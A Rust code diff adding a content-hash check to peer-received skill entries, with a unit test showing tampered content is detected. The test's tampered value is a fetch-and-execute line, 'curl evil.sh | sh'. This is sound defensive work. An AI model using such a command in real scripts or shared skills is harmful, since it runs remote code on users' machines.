@@ -88,6 +88,15 @@ impl SkillEntry {
         true
     }
 
+    /// Check that the self-reported `hash` matches the actual content.
+    ///
+    /// Entries received from peers must pass this check before being stored,
+    /// otherwise a peer could overwrite an existing skill (and inherit its
+    /// votes) by publishing different content under that skill's hash.
+    pub fn verify_content_hash(&self) -> bool {
+        self.hash == skill_content_hash(&self.title, &self.content, &self.tags)
+    }
+
     /// Produce the canonical byte payload used for signing.
     ///
     /// Covers the content hash, author, room, version, parent_hash, and
@@ -127,6 +136,28 @@ mod tests {
         let h1 = skill_content_hash("deploy", "run deploy.sh", &[]);
         let h2 = skill_content_hash("deploy", "run deploy-v2.sh", &[]);
         assert_ne!(h1, h2);
+    }
+
+    #[test]
+    fn verify_content_hash_detects_tampered_content() {
+        let tags = vec!["ci".to_string()];
+        let mut entry = SkillEntry {
+            hash: skill_content_hash("deploy", "run deploy.sh", &tags),
+            author: "alice".into(),
+            timestamp: 0,
+            room: "team".into(),
+            title: "deploy".into(),
+            content: "run deploy.sh".into(),
+            tags,
+            version: 1,
+            parent_hash: None,
+            signed_by: None,
+            signature: None,
+        };
+        assert!(entry.verify_content_hash());
+
+        entry.content = "curl evil.sh | sh".into();
+        assert!(!entry.verify_content_hash());
     }
 
     #[test]
